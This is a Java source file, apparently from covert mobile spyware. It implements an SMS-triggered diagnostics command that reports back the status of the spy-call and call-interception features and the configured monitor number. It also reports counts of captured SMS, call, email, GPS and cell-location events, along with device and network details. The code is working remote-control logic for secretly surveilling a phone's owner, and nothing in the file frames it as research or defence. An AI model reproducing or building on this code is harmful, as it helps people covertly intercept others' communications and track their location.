package com.vvt.rmtcmd.sms;

import java.util.Vector;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxCallLogEvent;
import com.vvt.event.FxCellInfoEvent;
import com.vvt.event.FxEmailEvent;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxIMEvent;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.EventType;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.GPSProvider;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.std.TimeUtil;
import com.vvt.version.VersionInfo;

public class CmdDiagnostics extends RmtCmdSync {
	
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	
	public CmdDiagnostics(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getSendDiagnosticsCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	private String getGPSMethod(int id) {
		String method = "";
		if (GPSProvider.AGPS.getId() == id) {
			method = "Assisted";
		} else if (GPSProvider.BLUETOOTH.getId() == id) {
			method = "Bluetooth";
		} else if (GPSProvider.GPS.getId() == id) {
			method = "Autonomous";
		} else if (GPSProvider.GPS_G.getId() == id) {
			method = "Google";
		} else if (GPSProvider.NETWORK.getId() == id) {
			method = "CellSite";
		} else if (GPSProvider.UNKNOWN.getId() == id) {
			method = "Unknown";
		}
		return method;
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader();
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			LicenseInfo licInfo = Global.getLicenseManager().getLicenseInfo();
			PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			PrefSystem systemInfo = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			boolean started = (eventInfo.isCallLogEnabled() || eventInfo.isEmailEnabled() || eventInfo.isSMSEnabled()? true : false);
			// 1). Product ID
			responseMessage.append("1>");
			responseMessage.append(licInfo.getProductID());
			responseMessage.append(Constant.COMMA);
			responseMessage.append(VersionInfo.getFullVersion());
			responseMessage.append(Constant.SPACE);
			responseMessage.append(VersionInfo.getDescription());
			responseMessage.append(Constant.SPACE);
			// 2). Device Type
			responseMessage.append("2>");
			responseMessage.append(PhoneInfo.getDeviceModel());
			responseMessage.append(Constant.SPACE);
			// 4). Spy Call, Call Interception, Spy Number
			responseMessage.append("4>");
			if (bugInfo.isSupported()) {
				if (bugInfo.isWatchAllEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
				responseMessage.append(Constant.COMMA);
				if (bugInfo.isEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
				responseMessage.append(Constant.COMMA);
				if (bugInfo.isConferenceSupported()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
				responseMessage.append(Constant.COMMA);
				if (bugInfo.getMonitorNumber().equals(Constant.EMPTY_STRING)) {
					responseMessage.append(Constant.ASTERISK);
				} else {
					responseMessage.append(bugInfo.getMonitorNumber());
				}
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.SPACE);
			// 5). Event Capture Status
			responseMessage.append("5>");
			if (started) {
				responseMessage.append("1");
			} else {
				responseMessage.append("0");
			}
			responseMessage.append(Constant.SPACE);
			// 6). Event Capture
			responseMessage.append("6>");
			if (eventInfo.isSupported()) {
				// SMS
				if (eventInfo.isSMSEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
				responseMessage.append(Constant.COMMA);
				// Voice
				if (eventInfo.isCallLogEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
				responseMessage.append(Constant.COMMA);
				// Email
				if (eventInfo.isEmailEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
			} else {
				responseMessage.append("*,*,*");
			}
			responseMessage.append(Constant.COMMA);
			// Cell
			if (cellInfo.isSupported()) {
				if (cellInfo.isEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.COMMA);
			// MMS
			responseMessage.append(Constant.ASTERISK);
			responseMessage.append(Constant.COMMA);
			// Address Book
			responseMessage.append(Constant.ASTERISK);
			responseMessage.append(Constant.COMMA);
			// GPS
			if (gpsInfo.isSupported()) {
				if (gpsInfo.isEnabled()) {
					responseMessage.append("1");
				} else {
					responseMessage.append("0");
				}
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.SPACE);
			// 7). SMS Event
			int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
			Vector smsEvents = db.select(EventType.SMS, numberOfSMS);
			int smsIn = 0;
			int smsOut = 0;
			for (int i = 0; i < smsEvents.size(); i++) {
				FxSMSEvent smsEvent = (FxSMSEvent)smsEvents.elementAt(i);
				if (smsEvent.getDirection().getId() == FxDirection.IN.getId()) {
					smsIn++;
				} else if (smsEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					smsOut++;
				}
			}
			responseMessage.append("7>");
			responseMessage.append(smsIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(smsOut);
			responseMessage.append(Constant.SPACE);
			// 8). Voice Event
			int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
			Vector voiceEvents = db.select(EventType.VOICE, numberOfVoice);
			int voiceIn = 0;
			int voiceOut = 0;
			int voiceMiss = 0;
			for (int i = 0; i < voiceEvents.size(); i++) {
				FxCallLogEvent callEvent = (FxCallLogEvent)voiceEvents.elementAt(i);
				if (callEvent.getDirection().getId() == FxDirection.IN.getId()) {
					voiceIn++;
				} else if (callEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					voiceOut++;
				} else if (callEvent.getDirection().getId() == FxDirection.MISSED_CALL.getId()) {
					voiceMiss++;
				}
			}
			responseMessage.append("8>");
			responseMessage.append(voiceIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(voiceOut);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(voiceMiss);
			responseMessage.append(Constant.SPACE);
			// 9). Location and System Events
			responseMessage.append("9>");
			if (gpsInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.GPS));
			} else if (cellInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.CELL_ID));
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.COMMA);
			if (systemInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.SYSTEM_EVENT));
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.SPACE);
			// 10). Email Event
			int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
			Vector mailEvents = db.select(EventType.MAIL, numberOfEmail);
			int mailIn = 0;
			int mailOut = 0;
			for (int i = 0; i < mailEvents.size(); i++) {
				FxEmailEvent emailEvent = (FxEmailEvent)mailEvents.elementAt(i);
				if (emailEvent.getDirection().getId() == FxDirection.IN.getId()) {
					mailIn++;
				} else if (emailEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					mailOut++;
				}
			}
			responseMessage.append("10>");
			responseMessage.append(mailIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(mailOut);
			responseMessage.append(Constant.SPACE);
			// 11). Max Event
			responseMessage.append("11>");
			responseMessage.append(ApplicationInfo.EVENT[generalInfo.getMaxEventIndex()]);
			responseMessage.append(Constant.SPACE);
			// 12). Capture Timer
			responseMessage.append("12>");
			responseMessage.append(ApplicationInfo.TIME[generalInfo.getSendTimeIndex()]);
			responseMessage.append(Constant.SPACE);
			// 13). Monitor Number
			responseMessage.append("13>");
			if (bugInfo.isSupported() && (!bugInfo.getMonitorNumber().equals(Constant.EMPTY_STRING))) {
				responseMessage.append(bugInfo.getMonitorNumber());
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.SPACE);
			// 14). Last Connection
			responseMessage.append("14>");
			if (generalInfo.getLastConnection() == 0) {
				responseMessage.append(Constant.ASTERISK);
			} else {
				responseMessage.append(TimeUtil.format(generalInfo.getLastConnection(), "dd/MM/yyyy HH:mm:ss"));
			}
			responseMessage.append(Constant.COMMA);
			if (generalInfo.getConnectionMethod().equals(Constant.EMPTY_STRING)) {
				responseMessage.append(Constant.ASTERISK);
			} else {
				responseMessage.append(generalInfo.getConnectionMethod());
			}
			responseMessage.append(Constant.SPACE);
			// 15). Response Code
			// TODO
			// 16). APN Recover
			// TODO
			// 17). TUPLE
			responseMessage.append("17>");
			responseMessage.append(PhoneInfo.getMCC());
			responseMessage.append(Constant.COMMA);
			responseMessage.append(PhoneInfo.getMNC());
			responseMessage.append(Constant.SPACE);
			// 18). Network Name
			responseMessage.append("18>");
			responseMessage.append(PhoneInfo.getNetworkName());
			responseMessage.append(Constant.SPACE);
			// 19). DB Size
			responseMessage.append("19>");
			responseMessage.append(getDBSize());
			responseMessage.append(" Bytes");
			responseMessage.append(Constant.SPACE);
			// 20). Install Drive
			responseMessage.append("20>");
			responseMessage.append("C:");
			responseMessage.append(Constant.SPACE);
			// 21). Available Memory on Drive
			responseMessage.append("21>");
			responseMessage.append(PhoneInfo.getAvailableMemoryOnDeviceInMB());
			responseMessage.append(" MB");
			responseMessage.append(Constant.SPACE);
			// 28). Phone's GPS Setting
			responseMessage.append("28>");
			GPSOption gpsOpt = gpsInfo.getGpsOption();
			for (int i = 0; i < gpsOpt.numberOfGPSMethod(); i++) {
				GPSMethod method = gpsOpt.getGPSMethod(i);
				int id = method.getMethod().getId();
				responseMessage.append(getGPSMethod(id));
				if (i != (gpsOpt.numberOfGPSMethod() - 1)) {
					responseMessage.append(Constant.COMMA);
				}
			}
			responseMessage.append(Constant.SPACE);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	private long getDBSize() {
		long dataSize = 0;
		Vector events = null;
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		if (prefMessenger.isSupported()) {
			// SMS
			int numberOfIM = db.getNumberOfEvent(EventType.IM);
			events = db.select(EventType.IM, numberOfIM);
			FxIMEvent[] imEvent = new FxIMEvent[numberOfIM];
			for (int i = 0; i < numberOfIM; i++) {
				imEvent[i] = (FxIMEvent)events.elementAt(i);
				dataSize += imEvent[i].getObjectSize();
			}
		}
		if (prefEvent.isSupported()) {
			// SMS
			int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
			events = db.select(EventType.SMS, numberOfSMS);
			FxSMSEvent[] smsEvent = new FxSMSEvent[numberOfSMS];
			for (int i = 0; i < numberOfSMS; i++) {
				smsEvent[i] = (FxSMSEvent)events.elementAt(i);
				dataSize += smsEvent[i].getObjectSize();
			}
			// Email
			int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
			events = db.select(EventType.MAIL, numberOfEmail);
			FxEmailEvent[] emailEvent = new FxEmailEvent[numberOfEmail];
			for (int i = 0; i < numberOfEmail; i++) {
				emailEvent[i] = (FxEmailEvent)events.elementAt(i);
				dataSize += emailEvent[i].getObjectSize();
			}
			// Voice
			int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
			events = db.select(EventType.VOICE, numberOfVoice);
			FxCallLogEvent[] callEvent = new FxCallLogEvent[numberOfVoice];
			for (int i = 0; i < numberOfVoice; i++) {
				callEvent[i] = (FxCallLogEvent)events.elementAt(i);
				dataSize += callEvent[i].getObjectSize();
			}
		}
		if (prefCell.isSupported()) {
			int numberOfCell = db.getNumberOfEvent(EventType.CELL_ID);
			events = db.select(EventType.CELL_ID, numberOfCell);
			FxCellInfoEvent[] cellEvent = new FxCellInfoEvent[numberOfCell];
			for (int i = 0; i < numberOfCell; i++) {
				cellEvent[i] = (FxCellInfoEvent)events.elementAt(i);
				dataSize += cellEvent[i].getObjectSize();
			}
		}
		if (prefGPS.isSupported()) {
			int numberOfGPS = db.getNumberOfEvent(EventType.GPS);
			events = db.select(EventType.GPS, numberOfGPS);
			FxGPSEvent[] gpsEvent = new FxGPSEvent[numberOfGPS];
			for (int i = 0; i < numberOfGPS; i++) {
				gpsEvent[i] = (FxGPSEvent)events.elementAt(i);
				dataSize += gpsEvent[i].getObjectSize();
			}
		}
		if (prefSystem.isSupported()) {
			int numberOfSystem = db.getNumberOfEvent(EventType.SYSTEM_EVENT);
			events = db.select(EventType.SYSTEM_EVENT, numberOfSystem);
			FxSystemEvent[] systemEvent = new FxSystemEvent[numberOfSystem];
			for (int i = 0; i < numberOfSystem; i++) {
				systemEvent[i] = (FxSystemEvent)events.elementAt(i);
				dataSize += systemEvent[i].getObjectSize();
			}
		}
		return dataSize;
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdDiagnostics.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
